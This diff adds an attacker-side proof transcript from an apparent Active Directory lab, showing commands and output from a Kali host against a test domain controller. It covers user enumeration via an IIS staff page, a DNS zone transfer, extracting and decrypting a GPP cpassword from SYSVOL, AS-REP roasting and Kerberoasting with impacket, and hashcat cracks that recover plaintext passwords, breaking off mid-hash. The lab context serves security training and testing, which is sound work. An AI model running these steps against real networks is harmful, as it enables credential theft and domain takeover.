@@ -1,0 +1,388 @@
+========================================================================
+  AD-PLAYGROUND ATTACKER-SIDE PROOF TRANSCRIPT
+  Generated live from kali (100.65.10.67) → DC 192.168.184.142 (secops.local)
+  Date: $(date)
+========================================================================
+
+========================================================================
+  PROOF: 0. Kali identity + DC connectivity
+  Date: $(date)  |  Kali → DC 192.168.184.142 (secops.local)
+========================================================================
+kali
+kali-Attacker
+    inet 127.0.0.1/8 scope host lo
+    inet 192.168.184.134/24 brd 192.168.184.255 scope global dynamic noprefixroute eth0
+    inet 100.65.10.67/32 scope global tailscale0
+
+PING 192.168.184.142 (192.168.184.142) 56(84) bytes of data.
+64 bytes from 192.168.184.142: icmp_seq=1 ttl=128 time=0.562 ms
+64 bytes from 192.168.184.142: icmp_seq=2 ttl=128 time=0.657 ms
+
+--- 192.168.184.142 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1031ms
+rtt min/avg/max/mdev = 0.562/0.609/0.657/0.047 ms
+
+
+========================================================================
+  PROOF: E9 — User Enumeration via IIS staff portal
+  Date: $(date)  |  Kali → DC 192.168.184.142 (secops.local)
+========================================================================
+>>> $ curl -sv http://192.168.184.142/staff/users.txt | head -15
+*   Trying 192.168.184.142:80...
+* Established connection to 192.168.184.142 (192.168.184.142 port 80) from 192.168.184.134 port 33502 
+* using HTTP/1.x
+> GET /staff/users.txt HTTP/1.1
+> Host: 192.168.184.142
+> User-Agent: curl/8.19.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Content-Type: text/plain
+< Last-Modified: Mon, 08 Jun 2026 06:26:37 GMT
+< Accept-Ranges: bytes
+< ETag: "ffa46ac2ff7dc1:0"
+< Server: Microsoft-IIS/10.0
+< X-Powered-By: ASP.NET
+< Date: Mon, 08 Jun 2026 13:29:11 GMT
+< Content-Length: 818
+< 
+{ [818 bytes data]
+* Connection #0 to host 192.168.184.142:80 left intact
+﻿aallen
+amitchell
+andrew.mitchell
+anelson
+
+>>> $ curl -s http://192.168.184.142/staff/users.txt | head -10
+﻿aallen
+amitchell
+andrew.mitchell
+anelson
+anthony.allen
+ashley.nelson
+barbara.garcia
+betty.wright
+bgarcia
+bwright
+
+
+========================================================================
+  PROOF: E6 — DNS Zone Transfer (the entire zone leaks)
+  Date: $(date)  |  Kali → DC 192.168.184.142 (secops.local)
+========================================================================
+>>> $ dig axfr secops.local @192.168.184.142
+
+; <<>> DiG 9.20.20-1-Debian <<>> axfr secops.local @192.168.184.142
+;; global options: +cmd
+secops.local.		3600	IN	SOA	win-uh1g6pm8k1d.secops.local. hostmaster.secops.local. 566 900 600 86400 3600
+secops.local.		600	IN	A	192.168.184.142
+secops.local.		3600	IN	NS	win-uh1g6pm8k1d.secops.local.
+_msdcs.secops.local.	3600	IN	NS	win-uh1g6pm8k1d.secops.local.
+_gc._tcp.Default-First-Site-Name._sites.secops.local. 600 IN SRV 0 100 3268 win-uh1g6pm8k1d.secops.local.
+_kerberos._tcp.Default-First-Site-Name._sites.secops.local. 600	IN SRV 0 100 88 win-uh1g6pm8k1d.secops.local.
+_ldap._tcp.Default-First-Site-Name._sites.secops.local.	600 IN SRV 0 100 389 win-uh1g6pm8k1d.secops.local.
+_gc._tcp.secops.local.	600	IN	SRV	0 100 3268 win-uh1g6pm8k1d.secops.local.
+_kerberos._tcp.secops.local. 600 IN	SRV	0 100 88 win-uh1g6pm8k1d.secops.local.
+_kpasswd._tcp.secops.local. 600	IN	SRV	0 100 464 win-uh1g6pm8k1d.secops.local.
+_ldap._tcp.secops.local. 600	IN	SRV	0 100 389 win-uh1g6pm8k1d.secops.local.
+_kerberos._udp.secops.local. 600 IN	SRV	0 100 88 win-uh1g6pm8k1d.secops.local.
+_kpasswd._udp.secops.local. 600	IN	SRV	0 100 464 win-uh1g6pm8k1d.secops.local.
+DomainDnsZones.secops.local. 600 IN	A	192.168.184.142
+_ldap._tcp.Default-First-Site-Name._sites.DomainDnsZones.secops.local. 600 IN SRV 0 100 389 win-uh1g6pm8k1d.secops.local.
+_ldap._tcp.DomainDnsZones.secops.local.	600 IN SRV 0 100 389 win-uh1g6pm8k1d.secops.local.
+ForestDnsZones.secops.local. 600 IN	A	192.168.184.142
+_ldap._tcp.Default-First-Site-Name._sites.ForestDnsZones.secops.local. 600 IN SRV 0 100 389 win-uh1g6pm8k1d.secops.local.
+_ldap._tcp.ForestDnsZones.secops.local.	600 IN SRV 0 100 389 win-uh1g6pm8k1d.secops.local.
+win-uh1g6pm8k1d.secops.local. 3600 IN	A	100.70.200.119
+win-uh1g6pm8k1d.secops.local. 3600 IN	A	192.168.184.142
+win-uh1g6pm8k1d.secops.local. 3600 IN	AAAA	fd7a:115c:a1e0::f639:c878
+secops.local.		3600	IN	SOA	win-uh1g6pm8k1d.secops.local. hostmaster.secops.local. 566 900 600 86400 3600
+;; Query time: 0 msec
+;; SERVER: 192.168.184.142#53(192.168.184.142) (TCP)
+;; WHEN: Mon Jun 08 21:29:32 +08 2026
+;; XFR size: 23 records (messages 1, bytes 1384)
+
+
+
+========================================================================
+  PROOF: E8 — GPP cpassword from SYSVOL → gpp-decrypt
+  Date: $(date)  |  Kali → DC 192.168.184.142 (secops.local)
+========================================================================
+>>> $ smbclient //192.168.184.142/SYSVOL -U 'secops.local/helpdesk01%Password1' -c '...; get Services.xml'
+getting file \secops.local\Policies\{ADP00001-0000-0000-0000-000000000001}\Machine\Preferences\Services\Services.xml of size 514 as Services.xml (251.0 KiloBytes/sec) (average 251.0 KiloBytes/sec)
+
+>>> $ cat Services.xml
+﻿<?xml version="1.0" encoding="UTF-8"?>
+<NTServices clsid="{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}">
+  <NTService clsid="{AB6D4B8D-B965-4328-B33D-F40FBE4A9B4E}" name="BackupSvc" image="0" changed="2024-01-15 10:00:00" uid="{ADP00003-0000-0000-0000-000000000003}" userContext="1" removePolicy="0">
+    <Properties startupType="AUTOMATIC" serviceName="BackupSvc" serviceAction="START" timeout="30" accountName=".\svc_backup" cpassword="wWHIrHyXsbFpBhpQ/fMKb937l23AEDtRzGbFYNAAcKE=" />
+  </NTService>
+</NTServices>
+
+>>> $ gpp-decrypt 'wWHIrHyXsbFpBhpQ/fMKb937l23AEDtRzGbFYNAAcKE='
+password123
+
+
+========================================================================
+  PROOF: C1 — AS-REP Roasting + hashcat crack
+  Date: $(date)  |  Kali → DC 192.168.184.142 (secops.local)
+========================================================================
+>>> $ impacket-GetNPUsers SECOPS.LOCAL/ -dc-ip 192.168.184.142 -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hash
+iams doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sadams doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User sgreen doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sharris doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User staylor doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+$krb5asrep$23$svc_legacy@SECOPS.LOCAL:396e39198b9cae2655c188cba1570041$0644d1978e00dc47116033b5dc42ae013e238c78c7a0fe26ce8278faf53fc675e2ba7a068acb12bdf0b75a6207939b90df0588dedaf4d482fa0b356be6e394626951502cb65db22635ad0e61a33ede9dfb2bf67bbf81a6820109a652b3665001ac6f3bc6a7df193778c0ad469529b3e62fac9e6fee99eef63548548cddd437b16b5e33e8d3c0b4b924d73f4a1f19784a376e67864e56384284187db0911f7323aae0f54866f916fb1af01106bfa4b01e58b40cad60f3da01ed83da93aa4badfbffe1772f5aeaa8aefde290056e4ca9567dab599c6c7abbefd89c0d8b6bf802729d18785d6b1f45ada1a64169
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User tthomas doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User wmiller doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+>>> $ cat asrep.hash | head -2
+$krb5asrep$23$analyst01@SECOPS.LOCAL:8b590d50e3229ac3141ba9bc90750589$d0f05dba627532479b58c5818af1e3bea0d7422dfffd8510cedad2d24edc75e448851eec34b80e2ddc60dc8cee503da8b88528065a4fd5e08de0ff8a0c1fd824ac3ba0f9b00e23183b3461c639adfffebaf7b1368765b75c95e32a885fedf549718bc08ab1299c5f0bd475110c41d3993310a1ce06ff91f9906afb7868f6e8d00d25a250f270ddc3d8dda2efd527cd85f76f59591fdb91c4786c5bc44f0d9ea6fe3667661bc6725ffcc7ebf2b27d0cf35539eb895299f3f1bd8793078e6e88faede5bd49cfbd6f2072611e8dfda83b53ee82b89319aa7678da5ac46ab2f89924092f44372ca2154e9f1d6d24
+$krb5asrep$23$jdoe_legacy@SECOPS.LOCAL:0cf151feaa0f7dc8148e42f299c15875$45da7cebf623bc86eca968d68eaebe37a0e8380c8d6a204f05d288acf79443b71b5139ff278d4fe7ce6d106c48915ed039d059cd41c856ba8c34b1ca6003207237b924445ec1449b5213e0195ccc1dc083573737fbbc30f4e3aaccb1462c3584cf54da8fdaeadd6bee1d0dc96ac5b612ff179d20fdc20fda3c22cba4151bce8f76697a3208e38ce20e6ea27aa16750cd9e9e7a647ffb652f3ad077a0f6f2935020af6e0b66655c56b515e4eb5f9e6bca6d03bb8ecf361e08f4b05f85b92042173870fb3f9f2a01358baced21574dbe5c6d5fe586c62babc736bd96fb56ef7e2eff96270e43d696e18c8df00b
+
+>>> $ hashcat -m 18200 asrep.hash quick.txt --show
+$krb5asrep$23$jsmith@SECOPS.LOCAL:4f20a41019c93dfe581ed4a58e525e49$6bc47e0c8c4b272df563d9dc349bbacef35c5043716a6f5d937e4fe6d98ec500beaae4a2bd07c0ed168bd9577b1521e702a4fc2792b6971843a0d919bce97d8cc67bcc9f1010cd1ee56dccdb17a8bf4005347b32014c33a3f0573ccd8fc1d3a93842f270f8050d6f7ddeff93622a52b98a051fea1244e03fdedc76c839b9ebf6e8282afd76767b9d99ea7968ca8df613ee0c5fb2e8b26c0896ed57e68d3343c6d7d8da8721144da1427c35d5760fd2e4ec6a2c5da30930f24dadd731a0f0c81f73f8f99ad815addb80e7fb20ff05aa4910fa902dcebff1a86dabfacf3f1c59879d8dff02819f672c730d108a:Password1
+$krb5asrep$23$svc_legacy@SECOPS.LOCAL:396e39198b9cae2655c188cba1570041$0644d1978e00dc47116033b5dc42ae013e238c78c7a0fe26ce8278faf53fc675e2ba7a068acb12bdf0b75a6207939b90df0588dedaf4d482fa0b356be6e394626951502cb65db22635ad0e61a33ede9dfb2bf67bbf81a6820109a652b3665001ac6f3bc6a7df193778c0ad469529b3e62fac9e6fee99eef63548548cddd437b16b5e33e8d3c0b4b924d73f4a1f19784a376e67864e56384284187db0911f7323aae0f54866f916fb1af01106bfa4b01e58b40cad60f3da01ed83da93aa4badfbffe1772f5aeaa8aefde290056e4ca9567dab599c6c7abbefd89c0d8b6bf802729d18785d6b1f45ada1a64169:abc123
+$krb5asrep$23$mjohnson@SECOPS.LOCAL:7ded151b7ab573dfbda9f124a9f852f5$beaee90a16f6b22bdf09b433c963e990b802f6be38106993b68beb8c7370080424adac5a88d969459d2562edf89dbebae923a54e18f96decc467abf8e0d3c65e5a24a2ed2ed588d306551a2201a3331d3334aafd1adc1b6ff00c7f42c6faa46049de0b381abb5f1c39638d75ad98f87b1b376bb8884abdede2b54f54ae44ea5a876ee83da8c730cbaa34fdea70f7e79a1b6656ce9b02680dbc73f00bc678876e0a5f2695690bc5e144fb40fa53221ba890989e443447171800cd2a07723e03e1bf710e56f26b3f57fb9a4ca27e60917060c5c1e5ae9544e5eb87af38b8999571fab84e638a4b900462b7154b:Password1
+$krb5asrep$23$mjohnson@SECOPS.LOCAL:4d9bd23574a50c2f62e3e20b0d506ecc$2ac1d50f2a6268bf264bf89055d3abb8ff0ade9326921ee43c4e81be198ee0203ac336b9da75fa1d8bbd350ddd2bd89292a116f31160347bc5141f3c2ef3c5c4f264a74f93032e1f2d6ba547f1dbf36bcbc3f1127f32dd65bad2ef1b60fc4eebf236e01a34c5c032b1f85fa97d44411328b1f199831557d591f6e107dd3f1c94b820d20f812ace714db6f544ea2228e12b5dd54ebc468360aa3dd9159c98d82dd3ed65a5103993eb9e18024a9c4ec3efe3431c8b3541c64f0d7124a678e67577cde5f02080c25c95be8f859e2c4d78af5ea714aa5b33eabe1ca759c70ae4fc92158a76587f7ee0a68d564836:Password1
+$krb5asrep$23$analyst01@SECOPS.LOCAL:8b590d50e3229ac3141ba9bc90750589$d0f05dba627532479b58c5818af1e3bea0d7422dfffd8510cedad2d24edc75e448851eec34b80e2ddc60dc8cee503da8b88528065a4fd5e08de0ff8a0c1fd824ac3ba0f9b00e23183b3461c639adfffebaf7b1368765b75c95e32a885fedf549718bc08ab1299c5f0bd475110c41d3993310a1ce06ff91f9906afb7868f6e8d00d25a250f270ddc3d8dda2efd527cd85f76f59591fdb91c4786c5bc44f0d9ea6fe3667661bc6725ffcc7ebf2b27d0cf35539eb895299f3f1bd8793078e6e88faede5bd49cfbd6f2072611e8dfda83b53ee82b89319aa7678da5ac46ab2f89924092f44372ca2154e9f1d6d24:Password1
+$krb5asrep$23$jsmith@SECOPS.LOCAL:f8295f7b356ba30efa0103e0c2328493$73b7a6597ed704c51c6728d87fb8e5042dd68a5a547f814165d25ed027f0d1ea7039651e2820dc91585bf039fc011129398dc7cbfaf1411c008ef8fd459cdd87dcd36f0b4d85c048613650d79d0a0fc9b6bea18299ab6a2e4105abb7da6eda4cacbc576e010bc8a6cef27d832d02fec3089b19bb6281f9420b7f19048fec7fb95a8fb43bd0dd5a8e1fa170b0f6fe066f2bb84836c87e53e2e39060b8ff5e66365cc81c0f24076b6bbae8bc3e3d4fb5b3c30789a8879f17a08b8d8daf377069e29ea51daabf179950981a29cfd57b1d9696a9c7d1fbb4bfbac6fcb3686d8ee8561f2ad6afb0d2e723a8c02f6d:Password1
+$krb5asrep$23$jdoe_legacy@SECOPS.LOCAL:0cf151feaa0f7dc8148e42f299c15875$45da7cebf623bc86eca968d68eaebe37a0e8380c8d6a204f05d288acf79443b71b5139ff278d4fe7ce6d106c48915ed039d059cd41c856ba8c34b1ca6003207237b924445ec1449b5213e0195ccc1dc083573737fbbc30f4e3aaccb1462c3584cf54da8fdaeadd6bee1d0dc96ac5b612ff179d20fdc20fda3c22cba4151bce8f76697a3208e38ce20e6ea27aa16750cd9e9e7a647ffb652f3ad077a0f6f2935020af6e0b66655c56b515e4eb5f9e6bca6d03bb8ecf361e08f4b05f85b92042173870fb3f9f2a01358baced21574dbe5c6d5fe586c62babc736bd96fb56ef7e2eff96270e43d696e18c8df00b:Welcome1
+
+>>> $ hashcat -m 18200 asrep.hash quick.txt --show 2>&1 | awk -F: '{print $1":"$NF}' | head -5
+
+
+========================================================================
+  PROOF: C2 — Kerberoasting + hashcat crack
+  Date: $(date)  |  Kali → DC 192.168.184.142 (secops.local)
+========================================================================
+>>> $ impacket-GetUserSPNs SECOPS.LOCAL/jdoe_legacy:Welcome1 -dc-ip 192.168.184.142 -request
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName             Name        MemberOf                                             PasswordLastSet             LastLogon                   Delegation    
+-------------------------------  ----------  ---------------------------------------------------  --------------------------  --------------------------  -------------
+HOST/backup01                    svc_backup  CN=Backup-Operators-Custom,OU=IT,DC=secops,DC=local  2026-06-08 14:26:35.205491  2026-06-07 22:10:16.736941                
+HTTP/web01                       svc_web                                                          2026-06-08 14:26:35.314853  <never>                     unconstrained 
+HTTP/web01.corp.local            svc_web                                                          2026-06-08 14:26:35.314853  <never>                     unconstrained 
+MSSQLSvc/db01.secops.local:1433  dbadmin                                                          2026-06-08 14:26:35.673326  <never>                                   
+MSSQLSvc/db01.corp.local:1433    dbadmin                                                          2026-06-08 14:26:35.673326  <never>                                   
+MSSQLSvc/db01:1433               dbadmin                                                          2026-06-08 14:26:35.673326  <never>                                   
+MSSQLSvc/sql01:1433              svc_sql                                                          2026-06-08 14:26:35.274456  2026-06-08 14:38:08.370002  constrained   
+MSSQLSvc/sql01.corp.local:1433   svc_sql                                                          2026-06-08 14:26:35.274456  2026-06-08 14:38:08.370002  constrained   
+RestrictedKrbHost/dc01           itadmin     CN=IT-Admins,OU=IT,DC=secops,DC=local                2026-06-08 14:26:35.453596  <never>                                   
+
+
+
+[-] CCache file is not found. Skipping...
+
+>>> $ hashcat -m 13100 tgs.hash quick.txt --show
+$krb5tgs$23$*svc_backup$SECOPS.LOCAL$SECOPS.LOCAL/svc_backup*$5e3488113beb27b1a7a02dc6bbc02fed$a6cf37136713d45ed27b453ad9e9af04f9f1836a17d7fcfeba57792e286b46bd680fc58afbe39fe21b36109e7ed719b53d16f24c8d4f722c4bdc77389bbbeb8e5249254f1e639a735a4760ba094211a5e81bcc94d3134512f04b377b5a2c141029109a59ed9fad08759ba1cf244bb2a02b74eece7cb0220d99d0111439063748b9989b0682f6081bc61416e470786e3f45b0837e9e00318b1506f1cd1a29beaa42e390c6e481da47dce9f96e96f6988c0aaf8cc5a46b1d6a5963fb9344acbb6b0a5be756c07b55d0adc588de16f5240218926a9613ec6592fb9820f812c0419e0c7d892b79e422266f3e908df95c79874302bc4f9a72ba484e6f1181ae1ee255656cca9585de6de13e2eb1dd3ba624c0870aeb5dfc31bebc5d8705e2fd29e6d956fa08f9e7c646133bd1ec78d5a8ec79dfca474d437672469ea6215203e76cb44891a0ff8b47b391485a5c32148c7a12f017993814e74e9ad8e46a8aa86e782c89d18c8d27add8f65781bfcfe04a6318eb4bd49744aad149e7f025c4f0f762d3762d50a7b2dee85af3cfea010fc44f3f25c72661af8821158932227832d71345239edba4a3ec05dcf95df82c1c6b87038a575b0e58bfded07a143ecd6f263262d26a548968c0c62a417bafae2dff14c315d8533d7b9805830f4db4165db69a2e775e84de50f092ddb44c70c6db216d285c04befe8627886a4e35b140cc81eb40648ee50f8e2502e0f769010c748bae505ed7f04225459f9a71e40b7d36303f0d201cd598eb8c7327273d78ffe2586062df744180735328a3ed25483e9d41ae42c52ae2164e3b58b6aab543c458b847ac34a775970c61a9e222c68192452570cc552ab4247667e7b323ef8c186b3616f8826c214865c7a7e432456b74673619e31dac93191a10fa2fd976dd7c7d91fb39345d080eff16b4446674bd7f4dddfdc39c5ea81c3c506223edcb22d87f148b13cfb94208f0a067ef3267eb10065ea016be451db30886d27b36c0e192283b3ce04fb7dc80dede473f32207730033d0266912814dcf97a8711ffcf919ca08a9ffcc5e9096a9a4c02c9f232947b679d28022e71efb61db4f74dd2556bb20251748abd337ec59ace391da84a1b19acc1fbc2be9fbf9f186b9b4c287139a5f983e89071debb24353526abb5f2a146e1628f562ddb9d5228a98c6e256908ec8e0f3814ffc4297c3e284c5712e69aaec52bd4d9b55df44089bf3a3de30f0c8370dcfbda5c03f7c79870e2206b953e9b8f4b03cb0307e4f66b2d14fc5c4e7525bf742198c7deaffaa06f1a7d4930f7d548412d095da8ce5c23be4820d8676a9e568ec56ff7dafe0cdc00be83ad8c2a93c2e176c1d83d98c3da698b1b8b1e35d6276873384f1ef8cd72c44fb91d20793e302b59962131e2b254237598e07243d28c35bc7e39b0da5e8fd4ee88bb6d263ef945966c08ed3868a0c973db7c0badf14b4677da606fd9d5421d540e:Monkey1
+$krb5tgs$23$*dbadmin$SECOPS.LOCAL$SECOPS.LOCAL/dbadmin*$4e1e8e3f2769de278a28686f8eb1522c$8d7a880780f9058f2d3791f0b8970770917754ac3078491c0c2daa0ac5950956a2d14ae1f6c0d5335ba0c6f144964a5402ff57452af4ed9867ea33efa296079e5715e55f32c982e9002773fc3108781bfc924289042d6d5d03bb66c704aab69b0a72604634eadc9eef7e7be9a5aef8d14cf68c8307369ae555174a43a357b3765831b4fbea02888e18cae084c4a338040ad059be47fa4599418efffc1bbef3315a39165fd8e477a355dd0b8682beedc03a223df2743b0f231aa362fa979163508cfcb42557ca7e71869fbc137c627f9b7b3f4641aa5bd03b88384cebbfb5ed9e5592fa19ac9c6aff6577834c7fe63de44ec06b2e7a3d2388f24e4bf87b78ddc5fde0ab89bba3153c014724f781aebb4fc5156e20b4bb7465dc5fe4e585bf547a623b6599a873c3f0b2ebb45b5b15a337e27e9ce9457b3cc0f379866016c67f7c27ff51a72c22f30c0e541db4ddafae348f2a284145337f535db54ca0aa8de65b2e4e85da854d8cd7832d4b30e150baf1efd4eede3f9b583802ee8d750a4c584695f07bbac8e3ae42499fc251c7206b7cb9351544f3392b5b06a5966c2e78c12a32c8dfb1792e34fb09f0d577a3c8ff060d4786035d71d652e1ef5106a616f39bfc9561bbf1654de4d65aa3265f26031c425ebf277fe8e5b752e490bb86b584fa127f280e65bc48b835eddbe621a9a47117f52d2774d779d6d71381d244bb34b652cc916d1d0669678ea92726331e4cf4a1a6ada9aff9388f043b047498e3221377178e4e9fbb708288d019cc1378d0a02b282fbd3971b035d680160b848bb926af6c1b4188bb4fae9279564da38f6b8aac02e9750befebf04d221346f663bf4e54b44cda737059c819e90b52aa9195422bfc4864e70b4a172d0e70f2efcc4087f7ffe72333366e90141bc5725dfccc7132821e4e80d3706d27a351c31e0fa1ef245e6287f16ed1b06c067b147c78dea1244ca560da67004230a06ff254705d63918ea59bb05adccec16e4dc9fd12522d145cfc3e67decd3c7183c6d633782e44ab0456e9d3628f23b339d2d189a279c00ec91aa5b82d49adbc60ad31a5c0f7918171ae1263b927e87079c5bd5028359ab1c0935a532fd7583b17c3bc4a14b98c0f12a2f91a9ae652df21575644872db12d8e86595cf8c164feb7cb1b906adfacbf079f4a240f6d312c5961e13c48fd735178df6dd9c9a6ae49bdd15e4177f5e22ff6928b33930acd35cdd0367c593711a0f29be252468eb75f8b2f7f607d8b1523bdcd7c96883c4dc3433f33d7a5b4535c2218ecb98e0aa6f8579bd154ac72340b0763f62912b2a83b620ca162b3a10cf93bb2da065d093917e27376a4c937d78a59662bedb0ea56b03f9effc6e784fc7d499048360fa1792a6abf0ffce9a5c687dc0b5d6b312e8b577ca8138c46ac85019c116bc10ee4c5b467fad9df8ce4abfaa7ed284f71d7100ff78f9d5e4691776ca320c414539506:trustno1
+$krb5tgs$23$*svc_sql$SECOPS.LOCAL$SECOPS.LOCAL/svc_sql*$c7346173846d05fd85ad38752a77479a$66ac832f4a0e3b45bb8e09cb88a7ada569b5f9912682dce345bc4a95b912f0339f85239942b52080e8f6c501c3e141437ace8ad52839cf44d4e7173ce3bfb8c79820397d24e70e944456df3e8ee2c4231b964514b7f6819f5559a10a117319bd3d051fe859dec9aa646a5887bcb1733d4240d0d9f65620e4ea7a2ebb314c8f2981151456314402446588b5082ed571eef25b1d43da7a38db942e33c2748d3cb3d49ace50b5fc21d39507aa765a8b59c1ad335a9ba03896fd218a4c0bd2a0ae82c8d43c43eb666eab9be17b7e5f8c24a64c98a15bdc94f12cfcfa29d7805a9b2aeea9ce178fd4e3a572dfb9982bcea394427f4f9f5fb33dc698f8c6b44f8a7151ee75f4b9b51ef3d2f8725628d769f3849a8eefdc792e398ba9cf438434237f279257694360cd3db3888fe7df42b47be2057c99734ef40da53aaad1525eb7fe2282d3aaff68b3de546d6202f8a8aa36451800ff1734ff8d556b0630bfac8957b817c2e5dbdd1a0ca6176fb2b7db1b5371b352788ad3eff461eea6a406ec0cab2c90877a2afc65b4feaac4967169186dff372731c7b8d9c2f68a2448d7af0fa606756e289fc0b8fd12277c8f140b2c1ba61c2162e2bb55c9df2e9b01ec86adb1e9f8d3137f9637ac1c69f0f4a86b112ae439c9fd0b7e24d170245353e0abf1fa07f0111e083877ab2c5a1778b546c3be84235480ddeaf3d4f6493148c2cd4323c562ee12b6ec3b155dc2126a2df6ce60acd10422ca15583195119454d162fa986f9a86da87ac910575f23cc5ad600c35dedb1bad02e5152e6832de21dede7cf7742afe2a14871e91c7d7f2987b30e36225f34f05d501d50ea638f57fc39c8b4ab5b55c89f79a6d3f792286cf726e0a436f1250fd7fd99b3c6319dd7e38ed57f8c54385202f7c6e7c278e92938f2d3e6a6d881982f364aa3bd7f08a07c5ccf45ae4fcda1cb6a967ee02eaa928fa852af3b8f441ce8af5d935f752293c6e9f8ac5c7c253222c927a9405d66b5986be3ac21a1d72dc8928fdd04a877c0af3159f46cada6e2842888cea801e973d9742f3b45d7e98f075740eb091f2cb021e65dbf3d38a0939fb6894976c7bf7a1d6862110ac353a44e3902a6e6614c705e01cf4d6f04374e6c5ce4be6d2fec23ec2aaca78fc5aaf5fd2fe1dfdc7d90f33bdf618f39c5220b5c3909df0bff30624a541eacd5dc9b22ad013a951fc1db6beab4f40996045314fc4a05e8fd62c3e0ccf67bca8a05192fef16bc2cce76ae7f69e76f1d5561f403fbbbc221f9e1397c019fd6fbc25b3d38fde82ef2a3a97e59ba6c4114b50629cc3b128c6cf6f11a8f6456bad904a64920b54372343754fdf42a7177358753e3ea18e4165d0c9386210393972f5266459f352e26541440ebb3ff9423e483695b434e66764063fd704b713deb80004460f5fd1b3d5b819b2ea614905486714940ea60fea22a1084dd9e40a6866598197452bebcf2960ae:dragon
+$krb5tgs$23$*itadmin$SECOPS.LOCAL$SECOPS.LOCAL/itadmin*$ce7864ca0404aeeae523cb4ac158b941$c9499da96f6c58e5ee96bb5522f4a0fe7de8611197833c8e27b6a2dec54676c71d43704e5256b77ac9f3d17c30476165dcfe18645192530dbc430f723961711f0d5d2cf2aa94f3e01cab3d5120451008d7e9153e680ff9020e532cc8605d2ec8e42956ffb1169ddcf4e41adc572ad23b8e094a9cded762765914eba30509cd06de2b1ee4ebecd40eb54445d5a7eb36170a85529dfbb41be6805dd41d1dabe58cb837b14cd657c8a3e368d7eea699b45323544626ca3d46ebbe4ac6a7d73e6fa8dfdbdb0a05d6262b0228e24f7409d74ee08649dfdac094ef1f9874cb8d778ec6af2c7d1ad3ddf1c75b71527f4c3d21abc2e5436f2abf1a46454a15030bea7d99a26b31ac7391f8e2440dde2147defabbfb1a582ca321e71637e4f4fdd2274457aaa45f7086c42ef3a4b08e05fb25cb0efd4bc8ab97f0f69e2ce4ed673ef1641a12923d68e07608ae1ef20cf0d4f22f35db3c99f1a161ed337f437c37ff2d26571fba6255ac231abdd090be6b43c8a17dbf1009e3deff46e139613c883ecda04432f75f24ccb718272d05a3bc57686fade95f7eef78094f029adeb56d499cbdd78ce99465e42fba7fb72576b7f21efecd9715d47ed3c675261d5d760e05269f7e8efd18aacea1245d5440e6419a7c9721b411454c9e80ee80139447ef4f1b2b19f55163fd403f64cf8f319a98e385e63140c9326c1debe68a59b21a776d4385062cd6ee59d4015c1e35186349a10a3410cc1ffaa30543e1e8f6ebe9b8d95cf70f3bb7907709a646753b576b69719341d68e334e8108c0206f33d78f2ed40fbba8daf730e5fa4ecf079151ef7807a00cc863d99b5d451cab9ad2dddbba34dda6826052789841433c36196f1212b779a55ffb276f9fa3dfa3781cda37a866ee824f30657946f174e10670a1023c02d101ec9e40304d11fc6de344cc3e563e41eefc426bf4923f94f8be7115a72a0433a1572f59f68ada9a4ab2beec06dc29693cca9e3ee821c3b610bdc603ecfd3c792d9ee39cdaea0872a77c8e258824a408a2c21a10fe06e225cb8b62ba2a8cfe7dbbdd62fb878e88ffbd1d05c95720eec3e8dbd6682767de443d157d0bcc99a37b3129cb449edb85bbb3d957ad28c90a240309170119371824879fa34fefba280f69aedfbfe211137e8d6e011f48a2c476e3e3a00637079f0bb3c72e317682773164dacdeac261dd7fb53277d37123508f4a879898074c0be088776f3b7d39384a3df6e4336ce33291b05e5a9fe3c7a110c14cc3f1f151fafca301d1a915a7bd69e9de1949cff2fa353a6e36e3305bd4051aab7f119fb5c8d5b7508a05f97757b998714f526f4be5fb56412d4b2f235866ddea98d03701b052b968770c47424335533d649d5ffe35a5a40d76d48a9df135bcec49cd672974d71e22e1226c6fb33383f6b1a098ccb86ba6fd690648b331f98dbf98d3f5687f7482a99826ff92c783dc6433ab073ab0889076:letmein
+$krb5tgs$23$*svc_web$SECOPS.LOCAL$SECOPS.LOCAL/svc_web*$ba487eca339bd68505d71ac9bf22ea05$cb22f3773b22b5cee188932cdd53bfd0b44423130ddfc2f9f87619a32c367a29fafb9631067c8dfd59f31d6402ef192fed8c5ebcacbb024e14ef0d06e4aab16538f59f5a7e89aa06a5439398ddfa9382a942d9d40484941acccf035f228e3e5b4e673f4c862d6662b94da2ca91c82bbc056df75a74ed2015be61a53c782d48465706f2b68ff91bc55deddf84c1fac0408230c501f3ab9006e19b2173beffbf4367e31d1bae8adfa585e8e518ad0e0dd3444036c96636daf0c44249f71e6f9a63a063fc820f0b0e00215a70ef8bf458087fb033ebd5c69586c57e5b75039577ce44983ea59310c3e39bc3f0d0d9c0b166c6770925e14d548c5946068ed6422e1d7210b40a42c56e6233de9845fd6cbb24862b9cb722ebda521df42a1db01de5bb8192b3e5c6a8704a1b63a8e94e8b873d2f787df40787f6af0a3f8a30e7c2d0e518b1fcf56371fa3c59ce51a7456b5c719aa031fa8168a758169e1f797169d3ba1516d3da81da9103988d3ef23cf8f37172ba28047d8b3ea476fb181927c666d6d847feb4318100b010be6773f054b31c599db3f40576e3ae49718a694061bef85cce47a5ab8bffb6168e2dddd7312a01a97eff497727aa1530236ce12eaae2f2f27ff5249d2fdcf59bedd62c8352e9de9f95b7dfe469c1c01c8d